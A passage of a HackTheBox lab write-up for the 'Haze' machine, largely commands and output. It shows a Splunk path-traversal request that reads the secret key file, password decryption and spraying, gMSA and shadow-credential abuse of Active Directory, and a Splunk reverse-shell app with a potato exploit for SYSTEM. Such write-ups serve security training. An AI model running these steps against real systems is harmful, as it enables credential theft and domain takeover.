emailAttribute <span class="o">=</span> mail
enableRangeRetrieval <span class="o">=</span> 0
groupBaseDN <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Splunk_LDAP_Auth,CN<span class="o">=</span>Users,DC<span class="o">=</span>haze,DC<span class="o">=</span>htb
groupMappingAttribute <span class="o">=</span> dn
groupMemberAttribute <span class="o">=</span> member
groupNameAttribute <span class="o">=</span> cn
host <span class="o">=</span> dc01.haze.htb
nestedGroups <span class="o">=</span> 0
network_timeout <span class="o">=</span> 20
pagelimit <span class="o">=</span> <span class="nt">-1</span>
port <span class="o">=</span> 389
realNameAttribute <span class="o">=</span> cn
sizelimit <span class="o">=</span> 1000
timelimit <span class="o">=</span> 15
userBaseDN <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Users,DC<span class="o">=</span>haze,DC<span class="o">=</span>htb
userNameAttribute <span class="o">=</span> samaccountname

<span class="o">[</span>authentication]
authSettings <span class="o">=</span> Haze LDAP Auth
authType <span class="o">=</span> LDAP
</pre></td></tr></tbody></table></code></div></div>

<p>from binDN we got the user Paul Taylor and the password which is encrypted will will decrypt the password with the secret using a tool called splunksecrets</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>➜  Haze python3 <span class="nt">-m</span> pip <span class="nb">install </span>splunksecrets
➜  Haze curl  <span class="s2">"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret"</span> <span class="o">&gt;</span> splunk.secret
➜  Haze splunksecrets splunk-decrypt <span class="nt">-S</span> splunk.secret
Ciphertext: <span class="nv">$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN</span>+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY<span class="o">=</span>
Ld@p_Auth_Sp1unk@2k24

</pre></td></tr></tbody></table></code></div></div>

<hr />
<p>Creds:
paul.taylor: Ld@p_Auth_Sp1unk@2k24
***</p>
<h2 id="user"><span class="me-2">User</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>dump all users</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>➜  Haze netexec smb haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span>  Ld@p_Auth_Sp1unk@2k24 <span class="nt">--rid-brute</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"SidTypeUser"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'('</span> <span class="s1">'{print $1}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'\'</span> <span class="s1">'{print $2}'</span> | <span class="nb">tee users
</span>Administrator 
Guest 
krbtgt 
DC01<span class="nv">$ </span>
paul.taylor 
mark.adams 
edward.martin 
alexander.green 
Haze-IT-Backup<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>now we could password spray all the users to see if there is password reuse with another useraccount</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>➜  Haze netexec smb haze.htb <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span>  Ld@p_Auth_Sp1unk@2k24 <span class="nt">--continue-on-success</span>
SMB         10.10.11.61     445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:haze.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>-] haze.htb<span class="se">\A</span>dministrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>-] haze.htb<span class="se">\G</span>uest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>-] haze.htb<span class="se">\k</span>rbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>-] haze.htb<span class="se">\D</span>C01<span class="nv">$:</span>Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>+] haze.htb<span class="se">\p</span>aul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>+] haze.htb<span class="se">\m</span>ark.adams:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>-] haze.htb<span class="se">\e</span>dward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>-] haze.htb<span class="se">\a</span>lexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             <span class="o">[</span>-] haze.htb<span class="se">\H</span>aze-IT-Backup<span class="nv">$:</span>Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
</pre></td></tr></tbody></table></code></div></div>
<p>and indeed mark.adams also uses the same password we could also winrm with this account</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>➜  Haze netexec winrm haze.htb -u mark.adams -p  Ld@p_Auth_Sp1unk@2k24                      
WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
WINRM       10.10.11.61     5985   DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>ark.adams<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /groups

GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                                  Type             SID                                         Attributes
<span class="o">===========================================</span> <span class="o">================</span> <span class="o">===========================================</span> <span class="o">==================================================</span>
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\C</span>ertificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
HAZE<span class="se">\g</span>MSA_Managers                          Group            S-1-5-21-323145914-28650650-2368316563-1107 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>TLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
</pre></td></tr></tbody></table></code></div></div>

<p>There is an interesting group which is gMSA_Mangers which hints that this user has permission on a group managed service accounts we could use netexec to know which service account is it</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>➜  Haze netexec ldap haze.htb <span class="nt">-u</span> mark.adams <span class="nt">-p</span>  Ld@p_Auth_Sp1unk@2k24 <span class="nt">--gmsa</span>    
LDAP        10.10.11.61     389    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:haze.htb<span class="o">)</span>
LDAPS       10.10.11.61     636    DC01             <span class="o">[</span>+] haze.htb<span class="se">\m</span>ark.adams:Ld@p_Auth_Sp1unk@2k24 
LDAPS       10.10.11.61     636    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting GMSA Passwords
LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup<span class="nv">$ </span>     NTLM: &lt;no <span class="nb">read </span>permissions&gt;                PrincipalsAllowedToReadPassword: Domain Admins
</pre></td></tr></tbody></table></code></div></div>

<p>We just need the read permission let’s try to enabled it
<a href="/assets/posts/Haze/Haze-1.png" class="popup img-link shimmer"><img src="/assets/posts/Haze/Haze-1.png" alt="" loading="lazy"></a>
and it works now we have the ntlm hash of this service account, we could enumerate ldap with the account</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>➜  Haze bloodhound-python <span class="nt">--collectionmethod</span> All <span class="nt">--username</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">--hashes</span> aad3c435b514a4eeaad3b935b51304fe:4de830d1d58c14e241aff55f82ecdba1 <span class="nt">-dc</span> dc01.haze.htb <span class="nt">--domain</span> haze.htb <span class="nt">-ns</span> 10.10.11.61 <span class="nt">--zip</span>
INFO: BloodHound.py <span class="k">for </span>BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
INFO: Found AD domain: haze.htb
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 <span class="nb">users
</span>INFO: Found 57 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done <span class="k">in </span>00M 21S
INFO: Compressing output into 20250628174021_bloodhound.zip
➜  Haze 
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/posts/Haze/Haze,.png" class="popup img-link shimmer"><img src="/assets/posts/Haze/Haze,.png" alt="" loading="lazy"></a></p>

<p>First we will use the WriteOwner to modify the dacl to Haze-IT-BACKUP$ as owner and then we will add ourselves to the group after that we have forceChangePassword to user EDWARD.MARTIN</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>bloodyAD --host "10.10.11.61" -d "haze.htb" -u 'Haze-IT-Backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' set owner 'SUPPORT_SERVICES' 'Haze-IT-Backup$'

bloodyAD --host "10.10.11.61" -d "haze.htb" -u 'Haze-IT-Backup$' -p ":4de830d1d58c14e241aff55f82ecdba1" add  genericAll 'support_services' 'Haze-IT-Backup$'

bloodyAD --host "10.10.11.61" -d "haze.htb" -u 'Haze-IT-Backup$' -p ":4de830d1d58c14e241aff55f82ecdba1" add groupMember "SUPPORT_SERVICES" 'Haze-IT-Backup$'
</pre></td></tr></tbody></table></code></div></div>

<p>Theoretically we should now change the password easy, Unfortunately we can’t because There is a minimum password age for edward.martin, so we can’t just change the password so we will add shadow credentials</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>➜  Haze bloodyAD <span class="nt">--host</span> <span class="s2">"10.10.11.61"</span> <span class="nt">-d</span> <span class="s2">"haze.htb"</span> <span class="nt">-u</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-p</span> <span class="s2">":4de830d1d58c14e241aff55f82ecdba1"</span> add shadowCredentials <span class="s2">"edward.martin"</span>               
<span class="o">[</span>+] KeyCredential generated with following sha256 of RSA key: 99a0895a675c570749b5a4898b12d1dbf83255ad027f40087dbf469d35a8d524
No outfile path was provided. The certificate<span class="o">(</span>s<span class="o">)</span> will be stored with the filename: SejxgrLl
<span class="o">[</span>+] Saved PEM certificate at path: SejxgrLl_cert.pem
<span class="o">[</span>+] Saved PEM private key at path: SejxgrLl_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following <span class="nb">command </span>to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py <span class="nt">-cert-pem</span> SejxgrLl_cert.pem <span class="nt">-key-pem</span> SejxgrLl_priv.pem haze.htb/edward.martin SejxgrLl.ccache
</pre></td></tr></tbody></table></code></div></div>

<p>we could use the command that bloodyAD gave us but it will only generate TGT ccache but there is another way to retrieve the hash</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>➜  Haze     openssl pkcs12 <span class="nt">-export</span> <span class="nt">-out</span> login.pfx <span class="nt">-inkey</span> SejxgrLl_priv.pem <span class="nt">-in</span> SejxgrLl_cert.pem                                                                                                                    
Enter Export Password:
Verifying - Enter Export Password:
➜  Haze certipy auth <span class="nt">-pfx</span> login.pfx <span class="nt">-u</span> <span class="s1">'edward.martin'</span> <span class="nt">-domain</span> haze.htb <span class="nt">-dc-ip</span> 10.10.11.61                                                                                                                          
Certipy v5.0.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate identities:
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     No identities found <span class="k">in </span>this certificate
<span class="o">[!]</span> Could not find identity <span class="k">in </span>the provided certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: <span class="s1">'edward.martin@haze.htb'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving credential cache to <span class="s1">'edward.martin.ccache'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote credential cache to <span class="s1">'edward.martin.ccache'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'edward.martin'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'edward.martin@haze.htb'</span>: aad3b435b51404eeaad3b435b51404ee:09e0b3eeb2e7a6b0d419e9ff8f4d91af
</pre></td></tr></tbody></table></code></div></div>
<p>just like that we have the user flag 
<a href="/assets/posts/Haze/Haze,-1.png" class="popup img-link shimmer"><img src="/assets/posts/Haze/Haze,-1.png" alt="" loading="lazy"></a></p>
<h2 id="root"><span class="me-2">Root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>getting root is fairly easy now we have access to C:\Backups\ which has a backup of splunk
we can find password in Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf this password is legacy and it uses a different secret in etc/auth/splunk.secret</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>➜  auth splunksecrets splunk-legacy-decrypt <span class="nt">-S</span> splunk.secret                          
Ciphertext: <span class="nv">$1$YDz8WfhoCWmf6aTRkA</span>+QqUI<span class="o">=</span>
Sp1unkadmin@2k24
</pre></td></tr></tbody></table></code></div></div>

<p>those credential do work in splunk after reading online you will find out that splunk let’s you run reverse shells and doesn’t consider it as a vulnerability so we will use an old script written 7 years ago but still works today
https://github.com/0xjpuff/reverse_shell_splunk</p>

<p>we will edit run.ps1 to write any rev shell we want</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nb">tar</span> <span class="nt">-cvzf</span> reverse_shell_splunk.tgz reverse_shell_splunk
<span class="nb">mv </span>reverse_shell_splunk.tgz reverse_shell_splunk.spl
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/posts/Haze/Haze,-2.png" class="popup img-link shimmer"><img src="/assets/posts/Haze/Haze,-2.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/posts/Haze/Haze,-4.png" class="popup img-link shimmer"><img src="/assets/posts/Haze/Haze,-4.png" alt="" loading="lazy"></a>
user has seImpersonatePrivilege we can just throw any potato exploit and see what works I will use SweetPotato which works great and then run any command as SYSTEM
<a href="/assets/posts/Haze/Haze,-5.png" class="popup img-link shimmer"><img src="/assets/posts/Haze/Haze,-5.png" alt="" loading="lazy"></a>
that’s pretty much the machine I had fun doing it even for the second time learned alot will do more like ISA</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/hackthebox/">HackTheBox</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Haze%20(Hard)%20-%20Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHaze%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Haze%20(Hard)%20-%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHaze%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHaze%2F&text=Haze%20(Hard)%20-%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Haze/">Haze (Hard)</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->


















            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  
    











            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Older">
      <p>-</p>
    </div>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/username">spect3r</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.3.0"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

